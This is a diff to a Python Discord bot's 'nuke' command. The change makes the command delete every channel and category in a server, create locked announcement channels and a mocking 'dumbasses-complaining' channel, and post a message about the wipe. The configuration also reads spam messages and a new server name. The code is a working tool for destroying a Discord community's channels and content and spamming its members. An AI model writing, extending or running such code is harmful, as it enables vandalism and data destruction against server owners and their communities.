@@ -1,6 +1,7 @@
 import discord, json
 from discord import Permissions
 from discord.ext import commands
+from datetime import datetime as local_time
 
 
 # Reads config.json file
@@ -8,6 +9,7 @@ with open('config.json', 'r') as config:
     config = json.load(config)
     token = config['bot_token']
     prefix = config['bot_prefix']
+    reason = config['reasoning']
     server_nuked_name = config['server_nuked_name']
     nuked_channels = config['nuked_channel_names']
     messages = config['spam_messages']
@@ -38,14 +40,23 @@ async def nuke(ctx):
     # Change discord bot presence.
     await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="a server get nuked."))
 
-    # Create nuking changelog channel, and reasoning channel. Then gets the id's of said channels.
-    await ctx.message.guild.create_text_channel('nuking-changelog')
-    await ctx.message.guild.create_text_channel('nuking-reason')
-    channels_to_ignore = {"reason":discord.utils.get(ctx.guild.channels, name='nuking-reason').id, "changelog":discord.utils.get(ctx.guild.channels, name = 'nuking-changelog').id}
-    
 
-    #Deletes all other channels
-    all_channels = bot.get_all_channels()
+    #Deletes all channels and categories
+    for item in ctx.guild.channels:
+        await item.delete()
+
+
+    # Create nuking changelog channel, and reasoning channel. Then gets the id's of said channels.
+    perms_overwrite = {discord.utils.get(ctx.guild.roles, name='@everyone'): discord.PermissionOverwrite(view_channel = True, send_messages = False)}
+    await ctx.message.guild.create_text_channel('nuking-changelog', overwrites = perms_overwrite)
+    await ctx.message.guild.create_text_channel('nuking-reason', overwrites = perms_overwrite)
+    await ctx.message.guild.create_text_channel('dumbasses-complaining')
+    reason_channel = discord.utils.get(ctx.guild.channels, name = 'nuking-reason')
+    changelog_channel = discord.utils.get(ctx.guild.channels, name = 'nuking-changelog')
+
+    embed = discord.Embed(title = 'All channels deleted.', description = f'Say good-bye to your old channels, the new #general is <#{changelog_channel.id}>', color = discord.Color.from_rgb(157, 51, 255))
+    embed.timestamp = local_time.now()
+    await changelog_channel.send(embed = embed)
 
 # Stop Command
 @bot.command()
